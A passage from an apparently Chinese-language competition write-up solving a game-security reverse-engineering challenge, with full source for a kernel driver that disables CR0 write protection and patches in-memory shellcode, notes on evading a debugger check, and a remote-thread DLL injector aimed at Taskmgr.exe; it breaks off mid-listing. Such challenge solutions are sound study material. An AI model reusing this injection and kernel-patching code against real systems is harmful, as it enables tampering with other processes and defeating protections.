class="keyword">struct</span> _<span class="title">SYSTEM_PROCESS_INFORMATION</span> &#123;</span></span><br><span class="line">    ULONG NextEntryOffset;</span><br><span class="line">    ULONG NumberOfThreads;</span><br><span class="line">    LARGE_INTEGER Reserved[<span class="number">3</span>];</span><br><span class="line">    LARGE_INTEGER CreateTime;</span><br><span class="line">    LARGE_INTEGER UserTime;</span><br><span class="line">    LARGE_INTEGER KernelTime;</span><br><span class="line">    UNICODE_STRING ImageName;</span><br><span class="line">    ULONG BasePriority;</span><br><span class="line">    HANDLE ProcessId;</span><br><span class="line">    HANDLE InheritedFromProcessId;</span><br><span class="line">&#125; SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_THREAD_INFORMATION</span> &#123;</span></span><br><span class="line">    LARGE_INTEGER KernelTime;</span><br><span class="line">    LARGE_INTEGER UserTime;</span><br><span class="line">    LARGE_INTEGER CreateTime;</span><br><span class="line">    ULONG WaitTime;</span><br><span class="line">    PVOID StartAddress;</span><br><span class="line">    CLIENT_ID ClientId;</span><br><span class="line">    ULONG Priority;</span><br><span class="line">    LONG BasePriority;</span><br><span class="line">    ULONG ContextSwitchCount;</span><br><span class="line">    LONG State;</span><br><span class="line">    LONG WaitReason;</span><br><span class="line">&#125; SYSTEM_THREAD_INFORMATION, *PSYSTEM_THREAD_INFORMATION;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">SYSTEM_INFORMATION_CLASS</span> &#123;</span></span><br><span class="line">    SystemProcessInformation = <span class="number">5</span></span><br><span class="line">&#125; SYSTEM_INFORMATION_CLASS;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SystemModuleInformation 11</span></span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)</span> &#123;</span><br><span class="line">    UNREFERENCED_PARAMETER(RegistryPath);</span><br><span class="line">    DriverObject-&gt;DriverUnload = UnloadDriver;</span><br><span class="line">    kprintf((<span class="string">&quot;Driver Loaded\n&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span> EnumerateKernelThreads();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">UnloadDriver</span><span class="params">(PDRIVER_OBJECT DriverObject)</span> &#123;</span><br><span class="line">    UNREFERENCED_PARAMETER(DriverObject);</span><br><span class="line">    kprintf((<span class="string">&quot;Driver Unloaded\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">EnumerateKernelThreads</span><span class="params">()</span> &#123;</span><br><span class="line">    UNICODE_STRING routineName;</span><br><span class="line">    RtlInitUnicodeString(&amp;routineName, <span class="string">L&quot;ZwQuerySystemInformation&quot;</span>);</span><br><span class="line">    ZWQUERYSYSTEMINFORMATION ZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)MmGetSystemRoutineAddress(&amp;routineName);</span><br><span class="line">    <span class="keyword">if</span> (!ZwQuerySystemInformation) &#123;</span><br><span class="line">        <span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line">    &#125;</span><br><span class="line">    ULONG returnLength = <span class="number">0</span>;</span><br><span class="line">    ZwQuerySystemInformation(SystemProcessInformation, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;returnLength);</span><br><span class="line">    PVOID buffer = ExAllocatePool(NonPagedPool, returnLength);</span><br><span class="line">    <span class="keyword">if</span> (!buffer) &#123;</span><br><span class="line">        <span class="keyword">return</span> STATUS_INSUFFICIENT_RESOURCES;</span><br><span class="line">    &#125;</span><br><span class="line">    NTSTATUS status = ZwQuerySystemInformation(SystemProcessInformation, buffer, returnLength, &amp;returnLength);</span><br><span class="line">    <span class="keyword">if</span> (!NT_SUCCESS(status)) &#123;</span><br><span class="line">        ExFreePool(buffer);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">    PSYSTEM_PROCESS_INFORMATION current = (PSYSTEM_PROCESS_INFORMATION)buffer;</span><br><span class="line">    <span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line">        PSYSTEM_THREAD_INFORMATION threadInfo = (PSYSTEM_THREAD_INFORMATION)(current + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; current-&gt;NumberOfThreads; i++) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (((UINT64)(threadInfo-&gt;StartAddress) &amp; <span class="number">0xFFFF000000000000</span>) == <span class="number">0xFFFF000000000000</span>) &#123;</span><br><span class="line">                 kprintf((<span class="string">&quot;Thread StartAddress: %p\n&quot;</span>), threadInfo-&gt;StartAddress);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            threadInfo++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (current-&gt;NextEntryOffset == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line">        current = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)current + current-&gt;NextEntryOffset);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ExFreePool(buffer);</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在中间我判断了一下地址是否为 <code>0xFFFF</code> 开头来判断是否为内核线程，然后打印出来之后，搜索通过栈回溯得到的 shellcode 的前几位。</p><img src="/2024/04/15/tencent-race-2024-pre/6.png" class=""><p>很幸运地只能找到一个，多次实验之后发现它shellcode是不会变的（至少头几个字节），那么就可以匹配特征码去判断 shellcode 的地址。</p><p>并且可以手动计算一下 shellcode StartAddress 和 对应要修改的指令的偏移。</p><p>启动地址：<code>0xFFFFBB0EDB013DB0</code></p><p>修改地址1：<code>0xffffbb0edb013e01</code></p><p>修改地址2：<code>0xffffbb0edb013e64</code></p><p>修改地址3：<code>0xffffbb0edb013ed4</code></p><p>分别是 <code>shellcode+0x51+1</code>，<code>shellcode+0xb4+1</code>，<code>shellcode+0x124+1</code> 的位置。（+1是因为要改的操作数在指令的偏移处）</p><p>先编写一个遍历内核线程的程序，然后去特判它的特征码，来确定shellcode位置，最后再写入三个指令即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntdef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntstatus.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)</span>;</span><br><span class="line">VOID <span class="title function_">UnloadDriver</span><span class="params">(PDRIVER_OBJECT DriverObject)</span>;</span><br><span class="line">NTSTATUS <span class="title function_">EnumerateKernelThreads</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span> <span class="params">(*ZWQUERYSYSTEMINFORMATION)</span><span class="params">(ULONG, PVOID, ULONG, PULONG)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_PROCESS_INFORMATION</span> &#123;</span></span><br><span class="line">    ULONG NextEntryOffset;</span><br><span class="line">    ULONG NumberOfThreads;</span><br><span class="line">    LARGE_INTEGER Reserved[<span class="number">3</span>];</span><br><span class="line">    LARGE_INTEGER CreateTime;</span><br><span class="line">    LARGE_INTEGER UserTime;</span><br><span class="line">    LARGE_INTEGER KernelTime;</span><br><span class="line">    UNICODE_STRING ImageName;</span><br><span class="line">    ULONG BasePriority;</span><br><span class="line">    HANDLE ProcessId;</span><br><span class="line">    HANDLE InheritedFromProcessId;</span><br><span class="line">&#125; SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_THREAD_INFORMATION</span> &#123;</span></span><br><span class="line">    LARGE_INTEGER KernelTime;</span><br><span class="line">    LARGE_INTEGER UserTime;</span><br><span class="line">    LARGE_INTEGER CreateTime;</span><br><span class="line">    ULONG WaitTime;</span><br><span class="line">    PVOID StartAddress;</span><br><span class="line">    CLIENT_ID ClientId;</span><br><span class="line">    ULONG Priority;</span><br><span class="line">    LONG BasePriority;</span><br><span class="line">    ULONG ContextSwitchCount;</span><br><span class="line">    LONG State;</span><br><span class="line">    LONG WaitReason;</span><br><span class="line">&#125; SYSTEM_THREAD_INFORMATION, *PSYSTEM_THREAD_INFORMATION;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">SYSTEM_INFORMATION_CLASS</span> &#123;</span></span><br><span class="line">    SystemProcessInformation = <span class="number">5</span></span><br><span class="line">&#125; SYSTEM_INFORMATION_CLASS;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SystemModuleInformation 11</span></span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)</span> &#123;</span><br><span class="line">    UNREFERENCED_PARAMETER(RegistryPath);</span><br><span class="line">    DriverObject-&gt;DriverUnload = UnloadDriver;</span><br><span class="line">    kprintf((<span class="string">&quot;Driver Loaded\n&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span> EnumerateKernelThreads();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">UnloadDriver</span><span class="params">(PDRIVER_OBJECT DriverObject)</span> &#123;</span><br><span class="line">    UNREFERENCED_PARAMETER(DriverObject);</span><br><span class="line">    kprintf((<span class="string">&quot;Driver Unloaded\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> CODE[]=&#123;</span><br><span class="line">    <span class="number">0x48</span> ,<span class="number">0x8B</span> ,<span class="number">0xC4</span> ,<span class="number">0x48</span> ,<span class="number">0x89</span> ,<span class="number">0x58</span> ,<span class="number">0x08</span> ,<span class="number">0x48</span> ,<span class="number">0x89</span> ,<span class="number">0x78</span> ,<span class="number">0x18</span> ,<span class="number">0x4C</span> ,<span class="number">0x89</span> ,<span class="number">0x70</span> ,<span class="number">0x20</span> ,<span class="number">0x55</span>,</span><br><span class="line">    <span class="comment">//0x48 ,0x8D ,0x68 ,0xA1 ,0x48 ,0x81 ,0xEC ,0xA0 ,0x00 ,0x00 ,0x00 ,0x48 ,0xBF ,0x4E ,0x93 ,0x32,</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">KIRQL <span class="title function_">WPOFFx64</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    KIRQL irql = KeRaiseIrqlToDpcLevel();</span><br><span class="line">    UINT64 cr0 = __readcr0();</span><br><span class="line">    cr0 &amp;= <span class="number">0xfffffffffffeffff</span>;</span><br><span class="line">    __writecr0(cr0);</span><br><span class="line">    _disable();</span><br><span class="line">    <span class="keyword">return</span> irql;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">WPONx64</span><span class="params">(KIRQL irql)</span></span><br><span class="line">&#123;</span><br><span class="line">    UINT64 cr0 = __readcr0();</span><br><span class="line">    cr0 |= <span class="number">0x10000</span>;</span><br><span class="line">    _enable();</span><br><span class="line">    __writecr0(cr0);</span><br><span class="line">    KeLowerIrql(irql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MDLWriteMemory(PVOID pBaseAddress, PVOID pWriteData, SIZE_T writeDataSize)</span><br><span class="line">&#123;</span><br><span class="line">    PMDL pMdl = <span class="literal">NULL</span>;</span><br><span class="line">    PVOID pNewAddress = <span class="literal">NULL</span>;</span><br><span class="line">    pMdl = MmCreateMdl(<span class="literal">NULL</span>, pBaseAddress, writeDataSize);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == pMdl)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    MmBuildMdlForNonPagedPool(pMdl);</span><br><span class="line">    pNewAddress = MmMapLockedPages(pMdl, KernelMode);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == pNewAddress)</span><br><span class="line">    &#123;</span><br><span class="line">        IoFreeMdl(pMdl);</span><br><span class="line">    &#125;</span><br><span class="line">    RtlCopyMemory(pNewAddress, pWriteData, writeDataSize);</span><br><span class="line">    MmUnmapLockedPages(pNewAddress, pMdl);</span><br><span class="line">    IoFreeMdl(pMdl);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">EnumerateKernelThreads</span><span class="params">()</span> &#123;</span><br><span class="line">    UNICODE_STRING routineName;</span><br><span class="line">    RtlInitUnicodeString(&amp;routineName, <span class="string">L&quot;ZwQuerySystemInformation&quot;</span>);</span><br><span class="line">    ZWQUERYSYSTEMINFORMATION ZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)MmGetSystemRoutineAddress(&amp;routineName);</span><br><span class="line">    <span class="keyword">if</span> (!ZwQuerySystemInformation) &#123;</span><br><span class="line">        <span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line">    &#125;</span><br><span class="line">    ULONG returnLength = <span class="number">0</span>;</span><br><span class="line">    ZwQuerySystemInformation(SystemProcessInformation, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;returnLength);</span><br><span class="line">    PVOID buffer = ExAllocatePool(NonPagedPool, returnLength);</span><br><span class="line">    <span class="keyword">if</span> (!buffer) &#123;</span><br><span class="line">        <span class="keyword">return</span> STATUS_INSUFFICIENT_RESOURCES;</span><br><span class="line">    &#125;</span><br><span class="line">    NTSTATUS status = ZwQuerySystemInformation(SystemProcessInformation, buffer, returnLength, &amp;returnLength);</span><br><span class="line">    <span class="keyword">if</span> (!NT_SUCCESS(status)) &#123;</span><br><span class="line">        ExFreePool(buffer);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">1</span>; k++) &#123;</span><br><span class="line">        PSYSTEM_PROCESS_INFORMATION current = (PSYSTEM_PROCESS_INFORMATION)buffer;</span><br><span class="line">        <span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line">            PSYSTEM_THREAD_INFORMATION threadInfo = (PSYSTEM_THREAD_INFORMATION)(current + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; current-&gt;NumberOfThreads; i++) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (((UINT64)(threadInfo-&gt;StartAddress) &amp; <span class="number">0xFFFFBB0000000000</span>) == <span class="number">0xFFFFBB0000000000</span>) &#123;</span><br><span class="line">                    kprintf((<span class="string">&quot;StartAddress %p\n&quot;</span>), threadInfo-&gt;StartAddress);</span><br><span class="line">                </span><br><span class="line">                    <span class="keyword">if</span> (MmIsAddressValid(threadInfo-&gt;StartAddress) &amp;&amp; RtlEqualMemory(threadInfo-&gt;StartAddress, CODE, <span class="keyword">sizeof</span>(CODE))) &#123;</span><br><span class="line">                        kprintf((<span class="string">&quot;Shellcode Found in %p\n&quot;</span>), threadInfo-&gt;StartAddress);</span><br><span class="line">                        <span class="type">char</span>* shellcode = threadInfo-&gt;StartAddress;</span><br><span class="line">                        MDLWriteMemory(shellcode + <span class="number">0x51</span> + <span class="number">1</span>, <span class="string">&quot;\x00&quot;</span>, <span class="number">1</span>);</span><br><span class="line">                        MDLWriteMemory(shellcode + <span class="number">0xb4</span> + <span class="number">1</span>, <span class="string">&quot;\x00&quot;</span>, <span class="number">1</span>);</span><br><span class="line">                        MDLWriteMemory(shellcode + <span class="number">0x124</span> + <span class="number">1</span>, <span class="string">&quot;\x00&quot;</span>, <span class="number">1</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                threadInfo++;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (current-&gt;NextEntryOffset == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line">            current = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)current + current-&gt;NextEntryOffset);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ExFreePool(buffer);</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>该文件编译产物为 XSafe2.sys，运行题目之后加载这个驱动可以让 token2 输出。</p></blockquote><p>通过下图可以看到，驱动加载后搜索到了 shellcode 的地址，并通过修改内存让 token成功输出了，但是自己做的时候发现是有概率的，有时候可能搜不到这个线程，从截图可以看出反复加载了4次才成功找到 shellcode，但是注入成功之后也成功输出了 token2。</p><img src="/2024/04/15/tencent-race-2024-pre/7.png" class=""><p>token1 的话可以采用新建 <code>C:\2024GameSafeRace.token1</code> 文件的方式让它将 token1 打印出来，究其原因没有成功输出出来是因为创建文件的时候没有让它在文件不存在时创建。</p><p>后面发现写文件的进程好像是 TaskMgr，并且 token1 是可以独立运行的，所以可以把虚拟机的测试模式关了，后面只需要分析这个三环程序即可。</p><p>用调试器附加，虽然外挂程序检测了调试器，但是通过改名可以绕过，断在创建文件的API上 <code>CreateFileA</code></p><img src="/2024/04/15/tencent-race-2024-pre/8.png" class=""><p>栈回溯一下发现创建是失败的（返回-1）。</p><img src="/2024/04/15/tencent-race-2024-pre/9.png" class=""><p>要让它成功输出让它创建成功即可，同时观察栈我注意到了有个参数3，而参数通过查阅 CreateFileA 的参数说明可知</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CREATE_NEW          1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CREATE_ALWAYS       2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OPEN_EXISTING       3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OPEN_ALWAYS         4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRUNCATE_EXISTING   5</span></span><br></pre></td></tr></table></figure><p>这也就解释了为什么创建一个文件能够成功写入，尝试把它修改成 1。</p><img src="/2024/04/15/tencent-race-2024-pre/10.png" class=""><p>发现成功返回了，所以目的非常明确了，让它传的第五个参数改成1即可成功输出到文件中，而刚好注意到上面的一条指令有直接 mov xxx,3 的，把它改成1试试。</p><img src="/2024/04/15/tencent-race-2024-pre/11.png" class=""><p>文件即使不存在也会创建并输出成功。</p><p>那么这里说一个可行的思路：同样注入一个 dll 给它，然后去遍历线程找到 shellcode 入口，计算偏移改掉这个指令，让 token3 成功输出。</p><p>先手动操作一遍：</p><img src="/2024/04/15/tencent-race-2024-pre/12.png" class=""><p>此时可以发现线程入口是 0000019B070AAB48，要修改的指令地址为 0000019B070A4D6D</p><p>在 StartRoutine - 0x5ddb 的位置上，而且它的地址很明显，只要在堆上就符合条件，但是为了保险还是取一定长度的特征码去比较。</p><p>那么据此写一个针对 Taskmgr 的注入器（二进制文件为 Xinject.exe）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXEFILEW <span class="string">L&quot;Taskmgr.exe&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXEFILE <span class="string">&quot;Taskmgr.exe&quot;</span></span></span><br><span class="line">DWORD old;</span><br><span class="line">SIZE_T written;</span><br><span class="line"><span class="function">DWORD <span class="title">FindProcess</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    HANDLE hSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    PROCESSENTRY32 pe32;</span><br><span class="line">    pe32 = &#123; <span class="built_in">sizeof</span>(pe32) &#125;;</span><br><span class="line">    BOOL ret = <span class="built_in">Process32First</span>(hSnap, &amp;pe32);</span><br><span class="line">    <span class="keyword">while</span> (ret)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">wcsncmp</span>(pe<span class="number">32.</span>szExeFile,  EXEFILEW, <span class="built_in">lstrlen</span>(EXEFILEW))) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;找到程序 %s ,PID=%d\n&quot;</span>, EXEFILE, pe<span class="number">32.</span>th32ProcessID);</span><br><span class="line">            <span class="keyword">return</span> pe<span class="number">32.</span>th32ProcessID;</span><br><span class="line">        &#125;</span><br><span class="line">        ret = <span class="built_in">Process32Next</span>(hSnap, &amp;pe32);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InjectModule</span><span class="params">(DWORD ProcessId, <span class="type">const</span> <span class="type">char</span>* szPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, ProcessId);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;进程句柄:%p\n&quot;</span>, hProcess);</span><br><span class="line">    LPVOID lpAddress = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0x100</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">    SIZE_T dwWriteLength = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(hProcess, lpAddress, szPath, <span class="built_in">strlen</span>(szPath), &amp;dwWriteLength);</span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)LoadLibraryA, lpAddress, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">VirtualFreeEx</span>(hProcess, lpAddress, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DWORD ProcessId = <span class="built_in">FindProcess</span>();</span><br><span class="line">    <span class="keyword">while</span> (!ProcessId) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;未找到%s程序，等待两秒中再试\n&quot;</span>,EXEFILE);</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">2000</span>);</span><br><span class="line">        ProcessId = <span class="built_in">FindProcess</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">InjectModule</span>(ProcessId, <span class="string">&quot;Xhack.dll&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后根据以上分析结果写一个改变这个代码的 DLL（二进制文件为 XHack.dll）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 